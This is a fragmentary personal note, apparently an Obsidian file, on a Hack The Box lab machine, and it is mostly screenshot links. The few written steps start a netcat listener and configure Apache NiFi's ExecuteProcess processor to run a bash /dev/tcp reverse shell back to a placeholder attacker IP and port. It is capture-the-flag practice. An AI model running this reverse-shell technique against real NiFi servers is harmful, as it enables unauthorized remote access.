
# #HTB 


![[Pasted image 20260810224115.png]]



Subomain founded
![[Pasted image 20260810225313.png]]



![[Pasted image 20260810230658.png]]



![[Pasted image 20260810230638.png]]


Start Linstner 

```bash
nc -lvp 4545
```

in NIFI


find process,m `ExecuteProcess` and Add it
![[Pasted image 20260811205910.png]]



![[Pasted image 20260811205926.png]]



Stop and Configure

```
Command - /bin/bash
Command Arguments - -c|bash i >& /dev/tcp/{YOUR IP}/{PORT} 0>&1
Argument Delimeter - |
```

![[Pasted image 20260811210010.png]]


Apply and start Service
Get Reverse Shell
![[Pasted image 20260811210406.png]]


![[Pasted image 20260811215020.png]]


![[Pasted image 20260811215239.png]]



![[Pasted image 20260811215248.png]]



![[Pasted image 20260811215531.png]]



![[Pasted image 20260811221018.png]]


![[Pasted image 20260811220959.png]]



